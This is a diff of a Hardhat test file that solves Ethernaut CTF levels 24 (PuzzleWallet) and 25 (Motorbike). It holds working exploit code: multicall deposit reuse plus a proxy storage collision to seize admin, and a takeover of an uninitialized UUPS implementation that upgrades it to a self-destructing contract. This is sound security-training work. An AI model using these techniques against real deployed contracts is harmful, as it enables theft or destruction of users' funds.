@@ -339,9 +339,9 @@ describe("Ethernaut", function () {
 			const implementationFactory = await ethers.getContractFactory("PuzzleWallet"); // implementation contract
 			const implementation = await implementationFactory.deploy();
 
-			const dataInitialize = implementation.interface.encodeFunctionData("init", [amount * BigInt(1000)]); // maximum balance will be overwritten by the proxy contract due to the storage collision
+			const dataInitialize = implementationFactory.interface.encodeFunctionData("init", [amount * BigInt(1000)]); // maximum balance will be overwritten by the proxy contract due to the storage collision
 
-			const proxyFactory = await ethers.getContractFactory("PuzzleProxy");
+			const proxyFactory = await ethers.getContractFactory("PuzzleProxy"); // transparent proxy patern
 			const proxy = await proxyFactory.deploy(owner, implementation, dataInitialize);
 
 			const proxyImplementation = implementationFactory.attach(proxy);
@@ -354,12 +354,12 @@ describe("Ethernaut", function () {
 
 			await proxyImplementation.connect(hacker).addToWhitelist(hacker);
 			const dataDeposit = [
-				implementation.interface.encodeFunctionData("deposit")
+				implementationFactory.interface.encodeFunctionData("deposit")
 			];
 			const dataMulticall = [
 				dataDeposit[0],
-				implementation.interface.encodeFunctionData("multicall", [dataDeposit]),
-				implementation.interface.encodeFunctionData("multicall", [dataDeposit])
+				implementationFactory.interface.encodeFunctionData("multicall", [dataDeposit]), // in reality this needs manual approach, see level 25
+				implementationFactory.interface.encodeFunctionData("multicall", [dataDeposit])
 			]
 			await proxyImplementation.connect(hacker).multicall(dataMulticall, { signer: hacker, value: amount }); // sending only 0.00001 ETH but recursively bumping balances mapping to 0.00003 ETH (total target's contract balance)
 			await proxyImplementation.connect(hacker).execute(hacker, amount * BigInt(3), "0x")
@@ -369,6 +369,42 @@ describe("Ethernaut", function () {
 			await proxyImplementation.connect(owner).setMaxBalance(hacker.address); // overwriting the admin of the proxy contract due to the storage collision
 			const adminCurrent = await proxy.admin();
 			expect(adminCurrent).to.equal(hacker, "Failed to pass level 24.");
+		});
+	});
+
+	describe("Level 25 - Motorbike", async () => {
+		it("Exploit", async () => {
+			const implementationFactory = await ethers.getContractFactory("Engine"); // implementation contract
+			const implementation = await implementationFactory.deploy();
+
+			const proxyFactory = await ethers.getContractFactory("Motorbike"); // UUPS proxy patern
+			const proxy = await proxyFactory.connect(owner).deploy(implementation);
+
+			const proxyImplementation = implementationFactory.attach(proxy);
+
+			// manual approach
+
+			let implementationAddressOld = await ethers.provider.getStorage(proxyImplementation, "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc"); // retrieve the implementation contract address
+			implementationAddressOld = "0x" + implementationAddressOld.substring(implementationAddressOld.length - 40, implementationAddressOld.length);
+
+			const initialize = (new ethers.Interface([
+				"function initialize()"
+			])).encodeFunctionData("initialize");
+			await hacker.sendTransaction({ from: hacker, to: implementationAddressOld, data: initialize }); // directly call the implementation contract and set the hacker as the upgrader
+
+			const exploitFactory = await ethers.getContractFactory("MotorbikeExploit");
+			const exploit = await exploitFactory.deploy();
+
+			const upgrade = (new ethers.Interface([
+				"function upgradeToAndCall(address newImplementation, bytes memory data)"
+			])).encodeFunctionData("upgradeToAndCall", [exploit.target, exploitFactory.interface.encodeFunctionData("destroy", [hacker.address])]);
+			await hacker.sendTransaction({ from: hacker, to: implementationAddressOld, data: upgrade }); // directly call the implementation contract and update the implementation address to the exploit contract and call selfdestruct() - this will delete the implementation contract
+
+			let implementationAddressNew = await ethers.provider.getStorage(implementation, "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc"); // retrieve the new implementation contract address
+			implementationAddressNew = "0x" + implementationAddressNew.substring(implementationAddressNew.length - 40, implementationAddressNew.length);
+			expect(implementationAddressNew.toUpperCase()).to.equal(exploit.target.toUpperCase(), "Failed to pass level 25."); // check if the implementation address is properly updated
+
+			// expect(await ethers.provider.getCode(implementationAddressOld)).to.equal("0x", "Failed to pass level 25."); // selfdestruct() actually no longer deletes the contract
 		});
 	});
 });
